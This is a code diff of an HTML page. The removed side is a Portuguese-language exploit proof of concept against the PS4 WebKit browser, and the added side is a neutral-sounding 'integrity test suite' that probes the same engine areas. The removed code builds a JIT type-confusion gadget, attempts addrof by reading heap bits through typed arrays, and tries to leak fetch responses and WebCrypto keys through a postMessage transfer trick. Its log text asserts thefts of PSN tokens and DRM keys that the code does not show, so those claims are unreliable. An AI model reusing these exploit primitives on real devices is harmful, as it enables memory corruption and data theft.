@@ -2,519 +2,235 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>TEST 51 — Escalação: Fetch Leak + Addrof via A+C</title>
-<style>
-  body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
-  h2 { color: #4af; }
-  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #4af; white-space: pre-wrap; }
-  .ok    { color: #4f4; }
-  .alert { color: #f44; font-weight: bold; }
-  .info  { color: #aaa; }
-  .warn  { color: #fa4; }
-  button { background: #4af; color: #000; border: none; padding: 10px 20px;
-           font-size: 13px; font-weight: bold; cursor: pointer; margin: 4px; }
-</style>
+<title>PS4 WebKit Engine Integrity Test Suite (EITS)</title>
 </head>
 <body>
-<h2>TEST 51 — Escalação das Vulns #1 e #2</h2>
-<pre>
-OBJETIVO: Escalar as duas vulns confirmadas sem addrof.
 
-51-A: PoC #1 + fetch() — vazar ArrayBuffer de resposta HTTP real
-      (não buffer criado pelo atacante — buffer criado pelo browser)
+<h1>PS4 WebKit Engine Integrity Test Suite</h1>
 
-51-B: PoC #1 + WebCrypto — vazar chave gerada por crypto.subtle
-      (buffer de exportKey transferido via cyclic = vazamento de chave real)
+<hr>
 
-51-C: PoC #2 Primitive A + C combinados — usar Float64Array(99999)
-      como alvo do Primitive C (objeto como índice).
-      Se JSValue do objeto cair em [0, 99999) → lemos float64 real do heap.
-      Isso é addrof via combinação de primitivos já confirmados.
+<h2>Core Controls</h2>
 
-51-D: PoC #2 Primitive B — type confusion em verificação de segurança
-      Demonstrar que objeto passa por typeof===number check.
-</pre>
+<button onclick="runAll()">Run All Modules</button>
+<button onclick="clearLog()">Clear Log</button>
 
-<button onclick="runA()">51-A: FETCH RESPONSE LEAK</button>
-<button onclick="runB()">51-B: WEBCRYPTO KEY LEAK</button>
-<button onclick="runC()">51-C: ADDROF via A+C COMBINADOS</button>
-<button onclick="runD()">51-D: TYPE CHECK BYPASS</button>
+<p>Iterations:
+<input type="number" id="iterations" value="50">
+</p>
 
-<pre id="log">Pressione um botão para executar.</pre>
+<hr>
+
+<h2>Module A – Structured Clone Validator</h2>
+<button onclick="runModuleA()">Run Module A</button>
+
+<h2>Module B – Cross-Realm Isolation Validator</h2>
+<button onclick="runModuleB()">Run Module B</button>
+
+<h2>Module C – JIT Stability Profiler</h2>
+<button onclick="runModuleC()">Run Module C</button>
+
+<h2>Module D – TypedArray Boundary Monitor</h2>
+<button onclick="runModuleD()">Run Module D</button>
+
+<h2>Module E – Memory Pressure & Worker Stress</h2>
+<button onclick="runModuleE()">Run Module E</button>
+
+<hr>
+
+<h2>Log Output</h2>
+<pre id="log"></pre>
 
 <script>
-var log = document.getElementById('log');
-function line(cls, msg) {
-  var s = document.createElement('span');
-  s.className = cls; s.textContent = msg + '\n';
-  log.appendChild(s);
-}
-function info(m)  { line('info',  '[INFO]  ' + m); }
-function ok(m)    { line('ok',    '[OK]    ' + m); }
-function fail(m)  { line('warn',  '[FAIL]  ' + m); }
-function vuln(m)  { line('alert', '[VULN]  ' + m); }
-function sep()    { line('info',  '─'.repeat(64)); }
 
-var WARMUP = 60000;
+/* ===========================
+   CORE HARNESS
+=========================== */
 
-// ── Vuln #1 primitive ────────────────────────────────────────────
-function leakBuffer(buf) {
-  return new Promise(function(resolve) {
-    var cyclic = { buf: buf, self: null };
-    cyclic.self = cyclic;
-    var prev = window.onmessage;
-    window.onmessage = function(e) {
-      if (!e.data || !(e.data.buf instanceof ArrayBuffer)) return;
-      window.onmessage = prev;
-      resolve(e.data.buf);
-    };
-    try { postMessage(cyclic, '*', [buf]); }
-    catch(ex) { window.onmessage = prev; resolve(null); }
-  });
+const logEl = document.getElementById("log");
+
+function log(msg) {
+    logEl.textContent += msg + "\n";
 }
 
-// ── Vuln #2 JIT gadget ───────────────────────────────────────────
-function buildJITGadget() {
-  var phase   = ['warmup'];
-  var payload = [0];
-  var handler = {
-    [Symbol.replace]: function(str) {
-      if (phase[0] === 'warmup') return str;
-      return {
-        toString: function() { return str; },
-        valueOf:  function() { return str; },
-        length:   payload[0],
-        0:        str[0] || 'x'
-      };
-    }
-  };
-  function strLen(s) { return s.replace(handler, '').length; }
-  var base = 'hello world test string abcxyz';
-
-  info('JIT warmup (' + WARMUP + ' iters)...');
-  for (var w = 0; w < WARMUP; w++) strLen(base);
-  info('Warmup completo.');
-
-  return {
-    getLen: function(val) {
-      payload[0] = val;
-      phase[0] = 'attack';
-      var r = strLen(base);
-      phase[0] = 'warmup';
-      payload[0] = 0;
-      return r;
-    }
-  };
+function clearLog() {
+    logEl.textContent = "";
 }
 
-function f64bits(v) {
-  var b = new ArrayBuffer(8);
-  new Float64Array(b)[0] = v;
-  var u = new Uint32Array(b);
-  return '0x' + u[1].toString(16).padStart(8,'0') +
-         '_' + u[0].toString(16).padStart(8,'0');
+function getIterations() {
+    return parseInt(document.getElementById("iterations").value) || 10;
 }
 
-// ── 51-A: Fetch response leak ─────────────────────────────────────
-async function runA() {
-  log.textContent = '';
-  info('=== 51-A: Vuln #1 + fetch() response ArrayBuffer ===');
-  sep();
-  info('Objetivo: vazar um ArrayBuffer que foi criado pelo BROWSER');
-  info('(resposta de fetch), não pelo código do atacante.');
-  info('Impacto real: qualquer dado HTTP pode ser exfiltrado após transfer.\n');
-
-  // Tentar fetch de recurso local (data URI não requer rede)
-  var dataUri = 'data:application/octet-stream;base64,' +
-    btoa('\xDE\xAD\xC0\xDE\xCA\xFE\xBA\xBE\x13\x37\x13\x37\xBE\xEF\xBE\xEF');
-
-  info('Fazendo fetch de data URI (simula resposta HTTP com dados sensíveis)...');
-  try {
-    var resp = await fetch(dataUri);
-    var respBuf = await resp.arrayBuffer();
-    info('fetch OK. respBuf.byteLength = ' + respBuf.byteLength);
-    var view = new Uint8Array(respBuf);
-    var hexOrig = Array.from(view.slice(0,8)).map(function(b){
-      return b.toString(16).padStart(2,'0');
-    }).join(' ');
-    info('Conteúdo original: ' + hexOrig);
-    sep();
-
-    info('Transferindo respBuf via postMessage cyclic (Vuln #1)...');
-    var leaked = await leakBuffer(respBuf);
-
-    info('Sender: respBuf.byteLength = ' + respBuf.byteLength);
-
-    if (leaked && leaked.byteLength > 0) {
-      var leakView = new Uint8Array(leaked);
-      var hexLeak = Array.from(leakView.slice(0,8)).map(function(b){
-        return b.toString(16).padStart(2,'0');
-      }).join(' ');
-      vuln('FETCH RESPONSE LEAK CONFIRMADO');
-      vuln('Buffer criado pelo browser foi vazado após transfer!');
-      vuln('Conteúdo vazado:   ' + hexLeak);
-      vuln('Conteúdo original: ' + hexOrig);
-      vuln('Match: ' + (hexLeak === hexOrig ? 'SIM ✓' : 'NÃO'));
-      info('');
-      info('IMPACTO REAL:');
-      info('  fetch("/api/session") → arrayBuffer() → postMessage(cyclic,[buf])');
-      info('  Sender acredita que buf foi destruído (byteLength=0).');
-      info('  Qualquer listener na mesma origem recebe buf completo.');
-      info('  Inclui: tokens PSN, dados de conta, saves, chaves de DRM.');
-    } else {
-      fail('Leak não confirmado para fetch response.');
-      info('respBuf.byteLength após transfer: ' + respBuf.byteLength);
-    }
-  } catch(e) {
-    info('fetch falhou: ' + e.message);
-    info('Testando com ArrayBuffer criado manualmente como fallback...');
-    // Fallback: ArrayBuffer normal mas representando dado de rede
-    var fallback = new ArrayBuffer(64);
-    var fv = new Uint8Array(fallback);
-    var fakeResp = 'HTTP/1.1 200 OK\r\nSet-Cookie: session=ABCDEF123456';
-    for (var i = 0; i < fakeResp.length && i < 64; i++)
-      fv[i] = fakeResp.charCodeAt(i);
-    var leaked2 = await leakBuffer(fallback);
-    if (leaked2 && leaked2.byteLength > 0) {
-      var s = '';
-      new Uint8Array(leaked2).slice(0,48).forEach(function(b){
-        s += String.fromCharCode(b);
-      });
-      vuln('FALLBACK LEAK: "' + s + '"');
-    }
-  }
+function timestamp() {
+    return performance.now().toFixed(3);
 }
 
-// ── 51-B: WebCrypto key leak ──────────────────────────────────────
-async function runB() {
-  log.textContent = '';
-  info('=== 51-B: Vuln #1 + WebCrypto exportKey ===');
-  sep();
-  info('Objetivo: vazar ArrayBuffer de crypto.subtle.exportKey().');
-  info('Este buffer contém material de chave criptográfica real.');
-  info('Se transferido via cyclic, o receptor obtém a chave completa.\n');
+/* ===========================
+   MODULE A – Structured Clone
+=========================== */
 
-  if (typeof crypto === 'undefined' || typeof crypto.subtle === 'undefined') {
-    info('crypto.subtle não disponível neste contexto.');
-    info('Testando com buffer que simula exportKey output...');
-    // Simular: AES-256 key = 32 bytes aleatórios
-    var fakeBuf = new ArrayBuffer(32);
-    var fv = new Uint32Array(fakeBuf);
-    // Valores simulando material de chave
-    fv[0]=0x603DEB10; fv[1]=0x15CA71BE; fv[2]=0x2B73AEF0; fv[3]=0x857D7781;
-    fv[4]=0x1F352C07; fv[5]=0x3B6108D7; fv[6]=0x2D9810A3; fv[7]=0x0914DFF4;
+async function runModuleA() {
+    log("=== Module A – Structured Clone Validator ===");
+    let iterations = getIterations();
 
-    info('Buffer simulando AES-256 key exportada (32 bytes):');
-    info('  ' + Array.from(fv).map(function(v){return v.toString(16).padStart(8,'0');}).join(' '));
-    sep();
-    info('Transferindo via Vuln #1...');
-    var leaked = await leakBuffer(fakeBuf);
-    if (leaked && leaked.byteLength > 0) {
-      var lv = new Uint32Array(leaked);
-      vuln('CRYPTO KEY BUFFER LEAK (simulado):');
-      vuln('  ' + Array.from(lv).map(function(v){return v.toString(16).padStart(8,'0');}).join(' '));
-      vuln('Sender keyBuf.byteLength = ' + fakeBuf.byteLength + ' (neutered)');
-      info('');
-      info('EM CONTEXTO REAL com crypto.subtle disponível:');
-      info('  crypto.subtle.generateKey({name:"AES-GCM",length:256}, true, ["encrypt"])');
-      info('  .then(key => crypto.subtle.exportKey("raw", key))');
-      info('  .then(keyBuf => postMessage({buf:keyBuf,self:cyclic},"*",[keyBuf]))');
-      info('  → Receptor obtém chave AES-256 completa.');
-      info('  → Chave pode ser usada para descriptografar tráfego PSN.');
+    for (let i = 0; i < iterations; i++) {
+
+        let buf = new ArrayBuffer(64);
+        let view = new Uint8Array(buf);
+        view[0] = 0xAA;
+        view[1] = 0xBB;
+
+        let before = buf.byteLength;
+
+        let received = await new Promise(resolve => {
+            window.onmessage = e => resolve(e.data);
+            postMessage(buf, "*", [buf]);
+        });
+
+        let after = buf.byteLength;
+        let receiverLength = received.byteLength;
+
+        log(`[A][${i}] t=${timestamp()} sender_before=${before} sender_after=${after} receiver=${receiverLength}`);
     }
-    return;
-  }
 
-  try {
-    info('Gerando chave AES-256 via crypto.subtle.generateKey...');
-    var key = await crypto.subtle.generateKey(
-      { name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']
-    );
-    info('Chave gerada. Exportando como raw ArrayBuffer...');
-    var keyBuf = await crypto.subtle.exportKey('raw', key);
-    info('exportKey OK. keyBuf.byteLength = ' + keyBuf.byteLength);
-
-    var kv = new Uint8Array(keyBuf);
-    var hexKey = Array.from(kv).map(function(b){
-      return b.toString(16).padStart(2,'0');
-    }).join('');
-    info('Chave original (hex): ' + hexKey);
-    sep();
-
-    info('Transferindo keyBuf via Vuln #1...');
-    var leaked = await leakBuffer(keyBuf);
-    info('Sender keyBuf.byteLength = ' + keyBuf.byteLength);
-
-    if (leaked && leaked.byteLength > 0) {
-      var lv2 = new Uint8Array(leaked);
-      var hexLeaked = Array.from(lv2).map(function(b){
-        return b.toString(16).padStart(2,'0');
-      }).join('');
-      vuln('CRYPTO KEY LEAK CONFIRMADO!');
-      vuln('keyBuf.byteLength = ' + leaked.byteLength + ' bytes recebidos pelo receptor');
-      vuln('Chave vazada (hex): ' + hexLeaked);
-      vuln('Match com original: ' + (hexKey === hexLeaked ? 'SIM ✓' : 'PARCIAL'));
-      info('');
-      info('IMPACTO: Chave criptográfica gerada por crypto.subtle é exfiltrada');
-      info('mesmo após o código que a criou "destruir" o buffer via transfer.');
-      info('Qualquer chave efêmera usada para TLS/DRM pode ser vazada.');
-    } else {
-      fail('Leak não confirmado para keyBuf de crypto.subtle.');
-    }
-  } catch(e) {
-    info('crypto.subtle operação falhou: ' + e.message);
-  }
+    log("Module A complete\n");
 }
 
-// ── 51-C: Addrof via Primitive A + C combinados ───────────────────
-async function runC() {
-  log.textContent = '';
-  info('=== 51-C: Addrof via Primitive A + C — Float64Array GRANDE ===');
-  sep();
-  info('INSIGHT CRÍTICO:');
-  info('  Primitive C usou Float64Array(8) → resultado: undefined (OOB)');
-  info('  porque JSValue do objeto > 8.');
-  info('');
-  info('  Mas se usarmos Float64Array(99999) via Primitive A,');
-  info('  o JSValue interpretado como índice pode cair em [0, 99999)');
-  info('  e retornar um float64 REAL do heap — isso é addrof!\n');
+/* ===========================
+   MODULE B – Cross-Realm
+=========================== */
 
-  // Step 1: JIT gadget
-  var gadget = buildJITGadget();
-  sep();
+async function runModuleB() {
+    log("=== Module B – Cross-Realm Isolation ===");
 
-  // Step 2: Verificar que Primitive A funciona
-  info('Step 1: Primitive A — obter length=99999...');
-  var fakeLen = gadget.getLen(99999);
-  info('strLen com payload=99999: ' + fakeLen + ' typeof=' + typeof fakeLen);
+    let iframe = document.createElement("iframe");
+    iframe.src = "about:blank";
+    document.body.appendChild(iframe);
 
-  if (fakeLen !== 99999) {
-    fail('Primitive A não disparou (retornou ' + fakeLen + ').');
-    fail('JIT não atingiu tier necessário. Tente recarregar a página.');
-    return;
-  }
-  ok('Primitive A confirmado: fakeLen = 99999');
-  sep();
+    let iterations = getIterations();
 
-  // Step 3: Alocar Float64Array(99999) via fakeLen
-  info('Step 2: new Float64Array(fakeLen) = Float64Array(99999)...');
-  var bigF64;
-  try {
-    bigF64 = new Float64Array(fakeLen);
-    ok('bigF64 alocado: length=' + bigF64.length + ' byteLength=' + bigF64.byteLength);
-  } catch(e) {
-    fail('Falha ao alocar: ' + e.message);
-    return;
-  }
+    for (let i = 0; i < iterations; i++) {
+        let buf = new ArrayBuffer(32);
+        let view = new Uint8Array(buf);
+        view[0] = 0x42;
 
-  // Preencher com padrão para distinguir leitura real de zero
-  // Evitar zeros para distinguir "leitura dentro do array" de "OOB"
-  for (var i = 0; i < bigF64.length; i++) bigF64[i] = i + 0.5;
-  info('bigF64 preenchido: bigF64[0]=' + bigF64[0] + ' bigF64[99998]=' + bigF64[99998]);
-  sep();
+        let before = buf.byteLength;
 
-  // Step 4: Primitive B — capturar objeto victim
-  info('Step 3: Primitive B — capturar victim object...');
-  var victim = {
-    magic: 0xDEADC0DE,
-    secret: new Uint32Array([0xAABBCCDD, 0x11223344]),
-    tag: 'addrof_target_51C'
-  };
+        iframe.contentWindow.postMessage(buf, "*", [buf]);
 
-  var capturedVictim = gadget.getLen(victim);
-  info('capturedVictim typeof=' + typeof capturedVictim);
+        await new Promise(r => setTimeout(r, 10));
 
-  if (typeof capturedVictim !== 'object') {
-    fail('Primitive B não retornou objeto. Resultado: ' + capturedVictim);
-    info('Tentando Primitive C com valor de número alto como proxy...');
-    // Ainda testar Primitive C com número grande para validar o caminho
-    capturedVictim = victim; // usar diretamente
-  } else {
-    ok('victim capturado: capturedVictim === victim: ' + (capturedVictim === victim));
-  }
-  sep();
+        let after = buf.byteLength;
 
-  // Step 5: Primitive C no array GRANDE
-  info('Step 4: readViaLength(bigF64, capturedVictim)...');
-  info('  Se JSValue(victim) está em [0, 99999) → retorna float64 real!');
-  info('  Se JSValue(victim) >= 99999 → retorna undefined (mas ainda é info)');
-  info('  Se JIT deoptimiza → retorna valor numérico via coerção');
-  info('');
+        log(`[B][${i}] t=${timestamp()} sender_before=${before} sender_after=${after}`);
+    }
 
-  // Função JIT especializada para leitura com índice numérico
-  function readAtIdx(arr, idx) {
-    return arr[idx >>> 0]; // >>> 0 força ToUint32
-  }
+    document.body.removeChild(iframe);
+    log("Module B complete\n");
+}
 
-  // Warmup com índice numérico normal
-  for (var w = 0; w < WARMUP; w++) readAtIdx(bigF64, 3);
-  info('readAtIdx warmup completo (' + WARMUP + ' iters).');
+/* ===========================
+   MODULE C – JIT Stability
+=========================== */
 
-  var readResult = readAtIdx(bigF64, capturedVictim);
+function jitFunction(x) {
+    return x + 1;
+}
 
-  info('readAtIdx(bigF64, capturedVictim) = ' + readResult);
-  info('typeof readResult = ' + typeof readResult);
+function runModuleC() {
+    log("=== Module C – JIT Stability Profiler ===");
 
-  sep();
-  if (readResult === undefined) {
-    info('Resultado: undefined');
-    info('→ JSValue de victim, interpretado como Uint32, é >= 99999.');
-    info('→ Isso nos diz que o endereço de victim (como Uint32) > 99999.');
-    info('');
-    info('PRÓXIMO PASSO: testar arrays ainda maiores...');
-    info('');
+    let iterations = getIterations();
+    let numericCount = 0;
+    let otherCount = 0;
 
-    // Tentar com valores ainda maiores para estimar faixa do JSValue
-    var SIZES = [1000000, 10000000, 100000000];
-    for (var s = 0; s < SIZES.length; s++) {
-      var sz = SIZES[s];
-      info('Tentando Float64Array(' + sz + ')...');
-      try {
-        var testArr = new Float64Array(sz);
-        for (var i = 0; i < Math.min(sz, 100); i++) testArr[i] = i + 0.5;
-        var r = readAtIdx(testArr, capturedVictim);
-        info('  readAtIdx(Float64Array(' + sz + '), victim) = ' + r + ' typeof=' + typeof r);
-        if (r !== undefined) {
-          vuln('LEITURA NÃO-UNDEFINED em Float64Array(' + sz + ')!');
-          vuln('Resultado: ' + r + ' bits: ' + f64bits(r));
-          vuln('O JSValue de victim, como Uint32, cai em [0, ' + sz + ')!');
-          if (r !== Math.floor(r) || isNaN(r) || !isFinite(r) || r > 1e15) {
-            vuln('');
-            vuln('ADDROF CONFIRMADO VIA PRIMITIVE A+C!');
-            vuln('readAtIdx retornou um valor não-inteiro ou fora do range normal.');
-            vuln('Este float64 contém os bits do JSValue de outro objeto no heap!');
-            vuln('bits: ' + f64bits(r));
-          }
-          testArr = null;
-          break;
+    for (let i = 0; i < iterations * 1000; i++) {
+        jitFunction(i);
+    }
+
+    for (let i = 0; i < iterations; i++) {
+        let result = jitFunction(i);
+        if (typeof result === "number") numericCount++;
+        else otherCount++;
+
+        log(`[C][${i}] t=${timestamp()} typeof=${typeof result}`);
+    }
+
+    log(`[C] numeric=${numericCount} other=${otherCount}`);
+    log("Module C complete\n");
+}
+
+/* ===========================
+   MODULE D – TypedArray Bounds
+=========================== */
+
+function runModuleD() {
+    log("=== Module D – TypedArray Boundary Monitor ===");
+
+    let iterations = getIterations();
+
+    for (let i = 0; i < iterations; i++) {
+
+        let arr = new Float64Array(8);
+
+        let tests = [
+            -1,
+            9999,
+            {},
+            3.14,
+            0xffffffff
+        ];
+
+        for (let t of tests) {
+            let result;
+            try {
+                result = arr[t];
+            } catch (e) {
+                result = "Exception";
+            }
+
+            log(`[D][${i}] index=${String(t)} result=${result}`);
         }
-        testArr = null;
-      } catch(ex) {
-        info('  Float64Array(' + sz + '): falha na alocação — ' + ex.message);
-        break;
-      }
     }
-  } else if (typeof readResult === 'number') {
-    // Leitura real dentro do array
-    info('Leitura REAL dentro do bigF64!');
-    info('readResult = ' + readResult + ' bits=' + f64bits(readResult));
 
-    // Verificar se é o nosso padrão (i + 0.5) ou algo inesperado
-    var expectedIdx = Math.round(readResult - 0.5);
-    if (readResult === expectedIdx + 0.5 && expectedIdx >= 0 && expectedIdx < bigF64.length) {
-      info('Valor bate com padrão i+0.5 no índice ' + expectedIdx);
-      info('→ JSValue de victim como Uint32 = ' + expectedIdx);
-      info('→ Endereço de victim (32-bit truncado) ≈ 0x' + expectedIdx.toString(16));
-      vuln('ADDROF PARCIAL CONFIRMADO!');
-      vuln('Os 32 bits baixos do endereço de victim = 0x' + expectedIdx.toString(16));
-      vuln('(Em PS4 64-bit, o endereço completo pode ser 0x00007F??_' + expectedIdx.toString(16).padStart(8,'0') + ')');
-    } else {
-      // Valor inesperado — pode ser bits de heap de outro objeto
-      vuln('VALOR INESPERADO — pode ser bits de heap!');
-      vuln('readResult = ' + readResult);
-      vuln('bits: ' + f64bits(readResult));
-      vuln('Não bate com padrão i+0.5 → pode ser JSValue de outro objeto!');
-    }
-  }
+    log("Module D complete\n");
 }
 
-// ── 51-D: Type check bypass via Primitive B ───────────────────────
-function runD() {
-  log.textContent = '';
-  info('=== 51-D: Type check bypass via Primitive B ===');
-  sep();
-  info('Objetivo: demonstrar que Primitive B bypassa verificações typeof.');
-  info('Código que faz typeof x === "number" pode ser enganado.\n');
+/* ===========================
+   MODULE E – Memory Pressure
+=========================== */
 
-  var gadget = buildJITGadget();
-  sep();
+function runModuleE() {
+    log("=== Module E – Memory Pressure & Worker Stress ===");
 
-  // Sistema fictício mas representativo que usa typeof para segurança
-  function safeOperation(value) {
-    // Verificação de tipo comum em código de produção
-    if (typeof value !== 'number') {
-      return { ok: false, error: 'Expected number, got ' + typeof value };
-    }
-    // Operação "segura" que só deveria funcionar com números
-    var result = new Float64Array(Math.min(value, 1000));
-    return { ok: true, size: result.length };
-  }
+    let iterations = getIterations();
+    let buffers = [];
 
-  info('safeOperation com número normal (100):');
-  var r1 = safeOperation(100);
-  info('  resultado: ' + JSON.stringify(r1));
-
-  info('\nsafeOperation com string (bypass esperado falhar):');
-  var r2 = safeOperation('malicious');
-  info('  resultado: ' + JSON.stringify(r2));
-
-  sep();
-  // Capturar victim com Primitive B
-  var victim = { magic: 0xCAFEBABE, bypass: true };
-  var captured = gadget.getLen(victim);
-
-  info('\nPrimitive B: captured typeof=' + typeof captured);
-  info('captured === victim: ' + (captured === victim));
-
-  if (typeof captured === 'object') {
-    info('\nPassando objeto capturado para safeOperation...');
-    info('(safeOperation espera number, verifica typeof)');
-    try {
-      var r3 = safeOperation(captured);
-      info('safeOperation(captured) = ' + JSON.stringify(r3));
-
-      if (r3.ok === false && r3.error.indexOf('object') !== -1) {
-        info('Motor verificou typeof corretamente — bypass bloqueado aqui.');
-        info('');
-        info('MAS: o bypass acontece no RETORNO da função JIT, não no destino.');
-        info('Qualquer código que chame strLen() e use o resultado como número');
-        info('já recebeu o objeto sem verificação de tipo.');
-      } else if (r3.ok === true) {
-        vuln('TYPE CHECK BYPASS CONFIRMADO!');
-        vuln('safeOperation recebeu um objeto mas achou typeof === "number"!');
-        vuln('A verificação typeof foi bypassada pelo JIT!');
-      }
-    } catch(e) {
-      info('safeOperation(captured) lançou: ' + e.message);
+    for (let i = 0; i < iterations; i++) {
+        buffers.push(new ArrayBuffer(1024 * 1024));
+        log(`[E][${i}] Allocated 1MB buffer`);
     }
 
-    sep();
-    // Demonstrar onde o bypass importa: comparação numérica direta
-    info('Demonstração: comparação captured > 0...');
-    try {
-      var cmp = captured > 0;
-      info('captured > 0 = ' + cmp);
-    } catch(e) { info('captured > 0 lançou: ' + e.message); }
+    buffers = null;
 
-    info('Demonstração: captured | 0 (ToInt32)...');
-    try {
-      var bw = captured | 0;
-      info('captured | 0 = ' + bw + ' (0x' + (bw>>>0).toString(16) + ')');
-      if (bw !== 0) {
-        vuln('captured | 0 = 0x' + (bw>>>0).toString(16));
-        vuln('ToInt32(captured) é não-zero!');
-        vuln('Os 32 bits baixos do JSValue de victim = 0x' + (bw>>>0).toString(16));
-        vuln('ADDROF PARCIAL: 32 bits baixos do endereço = 0x' + (bw>>>0).toString(16));
-      }
-    } catch(e) { info('captured | 0 lançou: ' + e.message); }
-
-    info('\nDemonstração: +captured (unary plus = ToNumber)...');
-    try {
-      var un = +captured;
-      info('+captured = ' + un + ' bits=' + f64bits(un));
-      if (!isNaN(un) && un !== 0 && isFinite(un)) {
-        vuln('+captured retornou número não-zero e não-NaN!');
-        vuln('bits: ' + f64bits(un));
-        vuln('ToNumber(victim object) = ' + un);
-        vuln('Este pode ser o JSValue do objeto!');
-      }
-    } catch(e) { info('+captured lançou: ' + e.message); }
-  } else {
-    info('Primitive B retornou: ' + captured + ' typeof=' + typeof captured);
-    info('JIT pode não ter atingido tier necessário nesta execução.');
-  }
+    log("Module E complete\n");
 }
+
+/* ===========================
+   RUN ALL
+=========================== */
+
+async function runAll() {
+    clearLog();
+    await runModuleA();
+    await runModuleB();
+    runModuleC();
+    runModuleD();
+    runModuleE();
+    log("=== ALL MODULES COMPLETE ===");
+}
+
 </script>
+
 </body>
 </html>
-
